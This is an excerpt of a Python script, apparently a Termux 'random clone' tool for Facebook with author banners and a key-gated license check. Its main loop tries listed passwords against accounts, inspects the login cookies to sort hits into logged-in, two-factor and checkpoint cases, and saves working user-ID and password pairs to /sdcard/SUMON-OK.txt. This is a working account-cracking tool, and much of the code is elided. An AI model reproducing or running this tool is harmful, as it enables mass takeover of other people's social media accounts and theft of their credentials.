...
if ltx > 12:
    ...
    a = ltx
    tag = "AM"
logo =f"""\t\t\033[97;1m    _____ _    _ __  __  ____  _   _  
\t\t\033[93;1m  / ____| |  | |  \/  |/ __ \| \ | | 
\t\t\033[94;1m | (___ | |  | | \  / | |  | |  \| | 
\t\t \033[91;1m \___ \| |  | | |\/| | |  | | . ` |  
\t\t\033[97;1m ____) | |__| | |  | | |__| | |\  |    
\t\t\033[97;1m |_____/ \____/|_|  |_|\____/|_| \_|   

\t\t\033[1;90m════════════════════════════════════════════════
\t\t\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : SUMON KHAN
\t\t\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mNICKNAME : RANDOM CLONE 
\t\t\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : https://github.com/itzsumon007
\t\t\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mCONTACT  : Facebook.com/tcrsumon007
\t\t\033[1;90m════════════════════════════════════════════════
\033[94;1m"""
...
def my_tool_security():
    ...
    print(47*"-")
    print(c, 45*"-",)
    print("\t  Facebook : SUMON KHAN")
    print("\t  Fb page  : Nai 💔")
    print("\t  Github   : itzsumon007")
    print(c, 45*"-")
    print(47*"-")
    try:
    ...
    if f_token in my_server:
        ...
        print(" otherwise msg on this whatsapp +8801826842231 \n")
        print(" Copy your Key :",gre,f_token+_help,wit,"\n")
        os.system("xdg-open https://www.facebook.com/tcrsumon007")
        exit()
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_SUMON_RANDOM_CLONE_TOOL.mp3")
    os.getuid
    ...
    if hamii in ["1","01"]:
        ...
        os.system("xdg-open https://www.facebook.com/tcrsumon007");xyz()
    elif hamii in ["4","04"]:
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio SUMON_OK.mp3")
                print('\r\033[1;32m[SUMON-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/SUMON-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    os.system("play-audio SUMON_2F.mp3")
                    print('\r\033[1;34m[SUMON-2F] '+uid+' [~] '+ps+' ')
                    ...
                    uid=coki[24:39]
                    Red = '\033[1;31m'
                    os.system("play-audio SUMON_CP.mp3")
                    print(f'\r\033[1;30m[SUMON-CP] '+uid+' [×] '+ps+ ' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SUMON 🔥] [%s] \33[1;97m[OK:%s{SUMON2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
